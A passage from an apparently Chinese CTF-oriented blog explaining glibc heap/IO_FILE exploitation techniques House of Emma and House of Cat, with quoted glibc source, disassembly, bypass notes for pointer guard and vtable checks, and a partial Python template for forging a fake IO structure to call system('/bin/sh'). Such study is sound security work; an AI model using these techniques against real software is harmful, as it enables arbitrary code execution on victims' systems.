class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的第一个参数也是来源于这个结构。所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p><strong>绕过 PTR_DEMANGLE</strong></p><p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，这意味着需要解决指针加密的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p>根据 <strong>GLIBC Wiki</strong> 上的解释 <a href="https://sourceware.org/glibc/wiki/PointerEncryption">Pointer Encryption</a>，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p><p>fs[0x30] 的值位于与 libc 相邻的 ld 空间中，这个位置距离 libc 地址的偏移固定，虽然无法泄露<strong>出这个位置随机值的内容，但是可以</strong>利用很多方法对其进行写入**：</p><ol><li>Fastbin Reverse Into Tcache</li><li>Tcache Stashing Unlink Attack</li><li>LargeBin Attack</li></ol><p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p><h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p><p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。</p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>参考<a href="https://bbs.kanxue.com/thread-273895.htm">[原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><strong>一种新型GLIBC中IO利用思路，目前适用于任何版本（包括glibc2.35）</strong></p><p><a href="https://bbs.pediy.com/thread-270429.htm">House of emma</a>是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>能够任意写一个可控地址。</li><li>能够泄露堆地址和libc基址。</li><li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li></ol><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h4 id="IO-FILE结构及利用"><a href="#IO-FILE结构及利用" class="headerlink" title="IO_FILE结构及利用"></a>IO_FILE结构及利用</h4><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，</p><p>常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），</p><p><strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p><h4 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h4><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p><p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p><h4 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h4><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p><p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p><blockquote><p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p></blockquote><hr><p>下面介绍另一种触发house of cat的方式FSOP</p><p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，这个函数会根据_IO_list_all刷新链表中的所有文件流，</p><p>在libc中代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p><p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），</p><p><strong>第三种情况在高版本中已经删除</strong>;</p><p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p><h4 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h4><p>在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中_IO_wfile_seekoff函数代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><p>对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>主要关注这几句，做了一下几点事情</p><ol><li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p></li><li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p></li><li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li><li>call调用[rax2+0x18]处的内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34` `&lt;_IO_switch_to_wget_mode``+``4``&gt;   mov  rax, qword ptr [rdi ``+` `0xa0``]</span><br><span class="line">0x7f4cae745d3f` `&lt;_IO_switch_to_wget_mode``+``15``&gt;  mov  rdx, qword ptr [rax ``+` `0x20``]</span><br><span class="line">0x7f4cae745d49` `&lt;_IO_switch_to_wget_mode``+``25``&gt;  mov  rax, qword ptr [rax ``+` `0xe0``]</span><br><span class="line">0x7f4cae745d55` `&lt;_IO_switch_to_wget_mode``+``37``&gt;  call  qword ptr [rax ``+` `0x18``]</span><br></pre></td></tr></table></figure><p>而rdi此时的状态:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p><p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p><p>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</p><p>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</p><h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p><h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p><p>需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span 